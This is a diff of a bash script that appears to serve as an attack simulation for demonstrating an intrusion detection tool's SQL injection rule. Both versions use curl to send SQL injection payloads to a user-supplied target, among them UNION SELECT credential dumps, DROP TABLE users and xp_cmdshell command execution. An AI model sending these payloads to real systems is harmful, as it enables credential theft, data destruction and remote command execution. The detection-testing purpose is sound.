@@ -1,56 +1,61 @@
-#!/bin/bash
-# =============================================================================
-# attack_sql.sh — SQL Injection Attack Simulation
+#!/usr/bin/env bash
+# attack_sql.sh — SQL Injection payloads via HTTP against the NetGuard target
 #
-# Sends HTTP requests containing SQL injection payloads to a target web server.
-# Detected by SqlInjectionRule via regex patterns on TCP payload (dst_port 80/443).
-# Patterns: ' OR, UNION SELECT, DROP TABLE, --, xp_cmdshell
+# Requirements: curl (pre-installed on Kali)
 #
-# Requirements: 6.1
-# Tools: curl
-# Usage:  ./demo/attack_sql.sh [target_url]
-#         Default target is http://localhost:80
-# =============================================================================
+# Usage: bash attack_sql.sh <TARGET_IP> [PORT]
+# Example: bash attack_sql.sh 192.168.1.50 5000
+#
+# What it triggers: SqlInjectionRule inspects TCP payloads on HTTP ports
+# (80, 443, 8080, 8443). Each request containing a SQL pattern triggers
+# an alert immediately (confidence = 100).
+#
+# NetGuard must be capturing packets on the interface facing this attacker.
 
 set -euo pipefail
 
-TARGET="${1:-http://localhost:80}"
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-LOG_FILE="${SCRIPT_DIR}/attack_sql.log"
+TARGET="${1:-}"
+PORT="${2:-5000}"
 
-echo "[*] SQL Injection Attack against ${TARGET}" | tee "${LOG_FILE}"
+if [[ -z "$TARGET" ]]; then
+  echo "Usage: bash attack_sql.sh <TARGET_IP> [PORT]"
+  exit 1
+fi
 
-PAYLOADS=(
-  "' OR '1'='1"
-  "' OR '1'='1' --"
-  "admin' --"
-  "' UNION SELECT * FROM users --"
-  "'; DROP TABLE users; --"
-  "' UNION SELECT username,password FROM admins --"
-  "admin' OR '1'='1' --"
-  "'; EXEC xp_cmdshell 'dir'; --"
-  "' OR 1=1 --"
-  "test@example.com' UNION SELECT 1,2,3,4 --"
-)
+BASE="http://${TARGET}:${PORT}"
 
-echo "[*] Sending ${#PAYLOADS[@]} SQL injection payloads..." | tee -a "${LOG_FILE}"
+echo "[*] Sending SQL injection payloads to $BASE"
 
-for payload in "${PAYLOADS[@]}"; do
-  echo "  → Sending: ${payload}" | tee -a "${LOG_FILE}"
-  curl -s -o /dev/null -w "    HTTP %{http_code}\n" \
-    --data-urlencode "username=${payload}" \
-    --data-urlencode "password=password" \
-    "${TARGET}/login" 2>&1 | tee -a "${LOG_FILE}"
-  sleep 0.1
-done
+# Pattern 1: ' OR
+echo "  [1] ' OR 1=1 --"
+curl -s -o /dev/null "$BASE/search?q=%27+OR+1%3D1+--"
 
-echo "[*] Sending payloads via URL parameters..." | tee -a "${LOG_FILE}"
-for payload in "${PAYLOADS[@]}"; do
-  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "${payload}")
-  echo "  → GET: ${encoded}" | tee -a "${LOG_FILE}"
-  curl -s -o /dev/null -w "    HTTP %{http_code}\n" \
-    "${TARGET}/search?q=${encoded}" 2>&1 | tee -a "${LOG_FILE}"
-  sleep 0.1
-done
+sleep 0.5
 
-echo "[*] SQL injection simulation complete." | tee -a "${LOG_FILE}"
+# Pattern 2: UNION SELECT
+echo "  [2] UNION SELECT"
+curl -s -o /dev/null "$BASE/items?id=1+UNION+SELECT+username%2Cpassword+FROM+users--"
+
+sleep 0.5
+
+# Pattern 3: DROP TABLE
+echo "  [3] DROP TABLE"
+curl -s -o /dev/null -X POST "$BASE/login" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "user=admin%27%3B+DROP+TABLE+users%3B--&pass=x"
+
+sleep 0.5
+
+# Pattern 4: -- comment
+echo "  [4] -- (comment injection)"
+curl -s -o /dev/null "$BASE/profile?id=1--"
+
+sleep 0.5
+
+# Pattern 5: xp_cmdshell
+echo "  [5] xp_cmdshell"
+curl -s -o /dev/null "$BASE/exec?cmd=1%3B+EXEC+xp_cmdshell%28%27whoami%27%29"
+
+echo "[✓] SQL injection payloads sent. Check the NetGuard dashboard for alerts."
+echo "    NOTE: NetGuard must be actively monitoring the network interface."
+echo "    Traffic must flow through the monitored interface (not loopback)."
